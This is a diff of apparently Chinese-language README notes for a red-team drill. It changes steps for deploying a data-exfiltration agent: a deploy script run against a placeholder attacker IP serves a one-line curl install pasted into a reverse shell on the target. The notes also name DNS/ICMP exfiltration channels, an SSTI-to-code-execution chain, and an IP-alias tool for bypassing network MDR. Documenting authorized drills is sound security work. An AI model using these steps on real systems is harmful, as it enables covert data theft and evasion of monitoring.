@@ -139,9 +139,9 @@ SSTI → os.popen → base64 -d → python3 → fork()
 sudo .venv/bin/python3 red_team/exfil_listener.py
 
 # 靶機 (C2 shell 或 reverse shell 內): 部署 agent
-# 先在攻擊機生成部署指令:
+# 先在攻擊機啟動臨時 HTTP server:
 bash red_team/deploy_agent.sh <ATTACKER_IP>
-# 然後將輸出貼到 shell 中執行
+# 然後將印出的 curl 指令貼到 shell 中執行
 ```
 
 通道: DNS (主) / ICMP (備用)，自動偵測切換。
@@ -208,7 +208,7 @@ Privilege Escalation 和 Impact 我們沒有做，主要是控制演練的影響
 | ip_switch.sh | `red_team/` | IP alias 管理（繞過網路 MDR） |
 | exfil_agent.py | `red_team/` | 靶機端自動蒐集 + 外傳 agent |
 | exfil_listener.py | `red_team/` | 攻擊機端 DNS/ICMP 接收器 |
-| deploy_agent.sh | `red_team/` | 一鍵生成 agent 部署指令 |
+| deploy_agent.sh | `red_team/` | HTTP server + 一行 curl 部署 agent (v3) |
 | post_exploit.sh | `red_team/` | 後滲透情報蒐集腳本 |
 
 ---
